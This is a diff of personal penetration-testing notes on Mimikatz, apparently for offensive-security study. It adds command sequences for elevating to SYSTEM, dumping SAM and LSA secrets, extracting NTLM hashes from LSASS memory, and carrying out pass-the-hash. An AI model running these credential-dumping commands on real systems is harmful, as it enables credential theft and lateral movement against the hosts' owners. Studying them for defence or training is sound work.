@@ -11,19 +11,36 @@ Used in Post Privilege Esculation in maintaining [[Persistence]] through credent
 - And more
 
 ```powershell
-privilege::debugv # enables the _SeDebugPrivilge_ access right
+privilege::debug # enables the _SeDebugPrivilge_ access right
 token::elevate # elevate the security token Administrator -> SYSTEM
 lsadump::lsa /patch
 lsadump::sam
 sekurlsa::logonPasswords
 ```
 
-### lsadumping
+### Extracting NTLM hashes from local SAM
 
 ```powershell
 privilege::debug
+token::elevate
+
 lsadump::lsa /patch
 lsadump::sam # Dump SAM database
+```
+
+### Extracting NTLM hashes from LSASS memory
+
+```powershell
+privilege::debug
+token::elevate
+
+sekurlsa::msv
+```
+These hashes can be used to perform [[Pass-The-Hash]] attacks by using `mimikatz` to inject an access token for the vicitim user on any command!
+```powershell
+token::revert
+sekurlsa::pth /user:<username> /domain:<domain-name> /ntlm:<ntlm hash> /run:<cmds goes here>
+sekurlsa:pth ... /run:""
 ```
 
 ## Kerberos Attacks
